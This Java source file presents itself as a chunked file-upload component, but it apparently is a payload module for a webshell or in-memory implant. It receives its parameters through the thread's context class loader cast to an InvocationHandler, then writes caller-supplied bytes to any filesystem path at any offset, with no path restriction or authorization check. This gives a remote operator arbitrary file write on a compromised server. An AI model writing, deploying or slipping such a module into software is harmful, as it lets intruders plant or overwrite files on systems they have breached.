package org.leo.core.component;

import java.io.File;
import java.io.RandomAccessFile;
import java.util.HashMap;

/**
 * 文件上传组件
 * 提供文件分块上传功能，兼容Java 1.5+
 * 
 * @author LeoSpring
 * @version 2.1
 */
public class FileUploadComponent implements Runnable {

    private static final Object UPLOAD_LOCK = new Object();

    private HashMap params;
    private HashMap results;
  
    
    
    public void run() {
        java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }

    
    /**
     * 主要执行方法
     */
    public void invoke() throws Exception {
        fileUpload();
    }

    /**
     * 文件上传（线程安全）
     */
    private void fileUpload() throws Exception {
        Object pathObj = params.get("path");
        Object offsetObj = params.get("offset");
        Object dataObj = params.get("data");

        if (!(pathObj instanceof byte[])) {
            throw new IllegalArgumentException("path 必须是 UTF-8 byte[]");
        }
        if (!(dataObj instanceof byte[])) {
            throw new IllegalArgumentException("data 必须是 byte[]");
        }
        String path = new String((byte[]) pathObj, "utf-8");
        long offset = offsetObj != null ? ((Number) offsetObj).longValue() : 0;
        byte[] data = (byte[]) dataObj;
        if (path.length() == 0) {
            throw new IllegalArgumentException("path 不能为空");
        }
        if (offset < 0L) {
            throw new IllegalArgumentException("offset 不能为负数");
        }

        File file = new File(path);
        synchronized (UPLOAD_LOCK) {
            if (file.exists() && file.isDirectory()) {
                throw new IllegalArgumentException("path 指向目录: " + path);
            }
            if (!file.exists() && !file.createNewFile()) {
                throw new IllegalStateException("无法创建文件: " + path);
            }

            RandomAccessFile outputFile = null;
            try {
                outputFile = new RandomAccessFile(file, "rw");
                outputFile.seek(offset);
                outputFile.write(data);
            } finally {
                closeResource(outputFile);
            }
        }
        results.put("code", Integer.valueOf(200));
        results.put("bytesWritten", Integer.valueOf(data.length));
        results.put("nextOffset", Long.valueOf(offset + data.length));
    }

    /**
     * 安全关闭资源
     */
    private void closeResource(java.io.Closeable resource) {
        if (resource != null) {
            try {
                resource.close();
            } catch (Exception e) {
                // 忽略关闭异常
            }
        }
    }
}
